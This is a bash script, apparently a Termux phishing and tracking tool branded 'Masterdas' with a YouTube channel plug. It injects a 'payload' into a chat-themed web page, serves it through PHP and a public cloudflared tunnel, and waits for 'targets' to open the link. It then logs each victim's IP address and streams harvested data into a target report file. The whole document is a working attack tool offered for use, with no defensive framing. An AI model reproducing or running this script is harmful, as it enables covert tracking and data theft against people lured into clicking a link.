#!/bin/bash
# Masterdas Update 2025
# Powered by TechChip mode by Mahadeb
# © AppShakti Bangla 
# visit https://youtube.com/@zerodarknexus

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m=======================================================\e[0m\n"
printf "\e[1;96m           🚀 Welcome to my project Script 🚀      \e[0m\n"
printf "\e[1;92m=======================================================\e[0m\n"
printf "\e[1;93m           🔥 M...R Powered by ZeroDark Nexus 🔥      \e[0m\n"
printf "\e[1;92m=======================================================\e[0m\n\n"
printf "\e[1;91m YouTube link=>\e[1;95m https://youtube.com/@zerodarknexus\e[0m\n\n"
printf "\e[1;92m=======================================================\e[0m\n\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 

}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}


cloudflare_tunnel() {
rm -f cf_tunnel.log

if command -v cloudflared &> /dev/null
then
    echo ""
else
    echo "Installing Cloudflared..."
    pkg update -y
    pkg install -y cloudflared

    echo "Cloudflared installation complete."
fi

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
cloudflared tunnel --url http://localhost:3333 --no-autoupdate > cf_tunnel.log 2>&1 &

sleep 10
link=$(grep -o 'https://[^ ]*\.trycloudflare.com' cf_tunnel.log | head -n 1)

if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Cloudflare Tunnel Failed, Check Your Internet!\e[0m\n"
    exit 1
else
    printf "\e[1;92m[+] Cloudflare Link:\e[0m \e[1;77m%s\e[0m\n" $link
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080 ...\n"
printf "\e[1;92m[\e[0m+\e[1;92m] Localhost URL http://127.0.0.1:8080 \n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
sleep 2
checkfound
}
Masterdas() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html
default_option_server="Y"
read -p $'\n\e[1;93m Do you public URL (Yes/y) cloudflared tunnel?\n\n \e[1;92m Type N run localhost:8080 [Public enter Y] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cloudflare_tunnel
sleep 1
else
local_server
sleep 1
fi
}

banner
dependencies
Masterdas
